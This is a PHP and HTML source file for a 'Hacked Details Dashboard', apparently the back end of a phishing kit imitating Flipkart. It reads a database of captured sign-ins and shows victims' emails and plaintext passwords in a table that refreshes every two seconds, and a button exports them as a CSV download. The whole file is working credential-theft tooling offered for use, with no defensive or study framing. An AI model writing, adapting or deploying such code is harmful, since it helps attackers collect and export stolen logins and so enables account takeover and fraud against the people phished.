<?php
$servername = "localhost";
$username = "root";
$password = "";
$database = "flipkart_fish";

$conn = mysqli_connect($servername, $username, $password, $database);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$query = "SELECT * FROM singin";
$result = mysqli_query($conn, $query);

$data = array();
if (mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }
}

mysqli_close($conn);

function arrayToCsv($data) {
    $csv = implode(',', array_keys($data[0])) . "\n";
    foreach ($data as $row) {
        $csv .= implode(',', $row) . "\n";
    }
    return $csv;
}

if (isset($_GET['download']) && $_GET['download'] === 'true') {
    $filename = 'dashboard_' . date('Ymd_His') . '.csv';

    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    echo arrayToCsv($data);
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Hacked details dashboard</title>
    <style>
        table {
            border-collapse: collapse;
            width: 100%;
        }

        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }

        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <h2>Hacked Details Dashboard</h2>

    <table id="dashboard-table">
        <tr>
            <th>Email</th>
            <th>Password</th>
            
        </tr>
        <?php foreach ($data as $row) : ?>
            <tr>
                <td><?php echo $row['email']; ?></td>
                <td><?php echo $row['password']; ?></td>
                
            </tr>
        <?php endforeach; ?>
    </table>

    <button id="download-csv">Download as CSV</button>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function updateDashboard() {
            $.ajax({
                url: "fetch_data.php",
                method: "GET",
                success: function(response) {
                    $("#dashboard-table").html(response);
                }
            });
        }

        updateDashboard();
        setInterval(updateDashboard, 2000); 

        $("#download-csv").on("click", function() {
            window.location.href = "dashboard.php?download=true";
        });
    </script>
</body>
</html>